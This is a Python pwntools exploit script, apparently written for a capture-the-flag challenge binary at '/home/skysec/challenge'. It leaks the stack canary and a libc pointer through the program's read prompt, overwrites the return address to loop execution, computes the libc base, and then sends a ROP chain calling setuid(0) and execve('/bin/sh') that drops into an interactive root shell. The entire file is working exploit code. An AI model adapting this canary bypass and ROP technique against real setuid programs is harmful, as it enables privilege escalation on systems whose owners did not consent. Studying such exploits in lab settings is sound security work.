from pwn import *


"""
OFFSET
CANARY
GADGET
"""

context.arch = "amd64"
#context.log_level = "debug"

OFFSET = 136
PATH = "/home/skysec/challenge"

flag = 0

while True:
	p = process(PATH)
	libc = ELF(p.libc.path)
	elf = ELF(PATH)

	p.recvuntil("the happiness is: ")
	buff = p.recv(14)
	log.info(b"Buffer @: " + buff)
	buff = int(buff, 16)
	CANARY_OFFSET = buff + OFFSET

	p.recvuntil("rid of your laziness: \n")
	p.send(hex(CANARY_OFFSET))
	p.send("\n")
	p.recvuntil("?: ")
	canary = p.recv(18)
	log.info(b"Canary: " + canary)


	PAYLOAD = b"A".ljust(OFFSET, b"A")
	PAYLOAD += p64(int(canary.decode(), 16))
	PAYLOAD += p64(0xdeadbeef)
	PAYLOAD += b"\x44"

	p.send(PAYLOAD)

	recieved = p.recvuntil("rid of your laziness: \n")
	flag = 1
	break


if flag == 1:
	__libc_start_main_loc = buff + 152
	p.send(hex(__libc_start_main_loc))
	p.send("\n")
	p.recvuntil("?: ")
	main_start = p.recv(14)
	log.info(b"Main LIBC START @:" + main_start)

	LIBC_BASE = int(main_start, 16) - 0x0000000000029dc0 + 0x30
	log.info("LIBC Base @:" + hex(LIBC_BASE))

	PAYLOAD = b"A".ljust(OFFSET, b"A")
	PAYLOAD += p64(int(canary.decode(), 16))
	PAYLOAD += p64(0xdeadbeef)
	PAYLOAD += b"\x44"
	p.clean()
	p.send(PAYLOAD)
	recieved = p.recvuntil("rid of your laziness: \n")
	log.info("Ready to send the actual payload")
	libc.address = LIBC_BASE
	print(recieved.decode())

	p.send(hex(__libc_start_main_loc))
	p.send("\n")
	p.recvuntil("?: ")
	main_start = p.recv(14)

LIBC_BINSH = libc.address + 0x00000000001d8678


rop = ROP(libc)
rop.call("setuid", [0])
rop.call("execve", [LIBC_BINSH, 0, 0])


PAYLOAD = b"A".ljust(OFFSET, b"A")
PAYLOAD += p64(int(canary.decode(), 16))
PAYLOAD += p64(0xdeadbeef)
PAYLOAD += rop.chain()
p.send(PAYLOAD)
p.interactive()
